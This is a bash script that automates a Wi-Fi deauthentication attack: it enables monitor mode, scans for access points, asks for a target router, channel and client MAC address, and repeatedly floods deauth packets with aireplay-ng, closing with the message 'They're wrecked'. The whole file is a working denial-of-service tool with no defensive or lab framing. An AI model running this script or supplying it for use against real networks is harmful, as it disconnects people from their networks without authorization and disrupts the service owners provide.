#!/bin/bash
sudo airmon-ng start wlp7s0 >> /dev/null
clear
sudo airodump-ng wlp7s0mon

echo "[+]Press Ctrl + C when you're done !"

echo "[+]Enter the BSSID of the router"
read bssid

echo "[+]Enter the Channel on which the AP is running"
read channel

sudo airodump-ng wlp7s0mon --bssid $bssid --channel $channel

echo "[+]Enter the MAC of the client"
read client

echo "[+]How many packets you want to send, (0) for infinite"
read packets

echo "How many time you want to deauth"
read n

echo "Enter sleep time"
read t

for ((i=1;i<=$n;i++))
do
	sudo aireplay-ng --deauth $packets -c $client -a $bssid wlp7s0mon
	sleep $t
done

sudo airmon-ng stop wlp7s0mon
clear
echo "They're wrecked"